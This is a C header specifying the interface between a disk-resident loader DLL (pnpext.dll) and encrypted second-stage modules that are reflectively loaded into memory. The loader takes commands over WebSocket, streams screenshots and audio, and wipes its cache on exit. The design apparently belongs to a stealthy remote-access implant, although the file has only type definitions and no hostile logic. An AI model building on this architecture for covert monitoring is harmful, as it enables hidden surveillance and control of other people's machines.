#pragma once
// ══════════════════════════════════════════════════════════════════════════
// Stage-2 ABI
// ──────────────────────────────────────────────────────────────────────────
// The contract between stage-1 (pnpext.dll, always on disk) and stage-2
// (encrypted .bin blobs reflectively loaded into memory on demand).
//
// Stage-1 is the thin WebSocket client + module loader.
// Stage-2 modules register command handlers via the HostCtx callbacks.
//
// ABI rules:
//   * C linkage only (no C++ name mangling across boundary)
//   * POD structs only (no std::string, no virtual tables)
//   * Strings are UTF-8, NUL-terminated const char*
//   * Owner keeps the memory; callee must copy if it needs lifetime > call
//   * All callbacks are thread-safe (stage-1 handles synchronization)
//
// Bump STAGE2_ABI_VERSION if any function signature or struct layout changes.
// Stage-1 rejects blobs whose reported ABI version != expected.
// ══════════════════════════════════════════════════════════════════════════

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

#define STAGE2_ABI_VERSION 1

// ── Callback signatures (all implemented by stage-1) ──

// Log a message. Level: 0=debug, 1=info, 2=warn, 3=error.
typedef void (*Stage2LogFn)(int level, const char* msg);

// Send a JSON-encoded response to the viewer over the WebSocket.
typedef void (*Stage2SendFn)(const char* json_response);

// Send binary data (e.g. screenshot, audio chunk) with a short header.
typedef void (*Stage2SendBinFn)(const uint8_t* data, size_t size, const char* type_hint);

// Command handler registered by stage-2; called by stage-1 when a matching
// command arrives from the viewer. `json_args` is the parsed payload.
typedef void (*Stage2CommandFn)(const char* json_args, void* user_ctx);

// Register a command handler. Re-registering overwrites.
typedef void (*Stage2RegisterCmdFn)(const char* cmd_name, Stage2CommandFn handler, void* user_ctx);

// Read a string value from the host config (host_config.json).
// Returns NULL if key is missing. Pointer is valid until next config reload.
typedef const char* (*Stage2GetConfigFn)(const char* key);

// Read an int value from the host config, or `def` if missing / not a number.
typedef int (*Stage2GetConfigIntFn)(const char* key, int def);

// ── ABI v1 extensions (filled in by stage-1; fields are at fixed offsets
// that were previously reserved_ptrs[0..1] so old stage-2 modules still
// see a compatible struct and simply ignore these slots) ──

// Stop any current streaming pipeline (stream_start was called earlier).
// No-op if not currently streaming. Synchronous.
typedef void (*Stage2StopStreamFn)(void);

// Ask stage-1 to exit the process. Stage-1 joins workers, wipes the
// stage-2 cache, then calls ExitProcess(exit_code). Call returns
// immediately — the exit is deferred to a background thread.
typedef void (*Stage2HostExitFn)(int exit_code);

// ── HostCtx: the only argument to Stage2Init ──
typedef struct Stage2HostCtx {
    uint32_t           abi_version;       // MUST equal STAGE2_ABI_VERSION
    uint32_t           reserved0;         // reserved, set to 0

    Stage2LogFn            log;
    Stage2SendFn           send;
    Stage2SendBinFn        send_bin;
    Stage2RegisterCmdFn    register_cmd;
    Stage2GetConfigFn      get_config;
    Stage2GetConfigIntFn   get_config_int;

    // Room token — needed by some stage-2 modules for per-deployment keys.
    const char*        room_token;

    // ABI v1.1 callbacks — safe to call after checking they're non-null.
    Stage2StopStreamFn  stop_stream;   // ABI v1.1, was reserved_ptrs[0]
    Stage2HostExitFn    host_exit;     // ABI v1.1, was reserved_ptrs[1]

    // Still reserved for future growth without breaking ABI.
    void*              reserved_ptrs[6];
} Stage2HostCtx;

// ── Stage-2 entry point ──
// Every stage-2 DLL exports exactly this symbol.
// Returns 0 on success, non-zero on error (stage-1 unloads the module).
// Stage-2 must complete initialization before returning — registering all
// its command handlers via host->register_cmd(). After return, stage-1
// routes matching commands into those handlers.
typedef int (*Stage2InitFn)(Stage2HostCtx* host);
#define STAGE2_INIT_EXPORT "Stage2Init"

// ── Stage-2 shutdown (optional export) ──
// Called by stage-1 before unloading the module. Must unregister global
// state, join threads, free resources. Module is unloaded immediately
// after this returns.
typedef void (*Stage2ShutdownFn)(void);
#define STAGE2_SHUTDOWN_EXPORT "Stage2Shutdown"

#ifdef __cplusplus
} // extern "C"
#endif
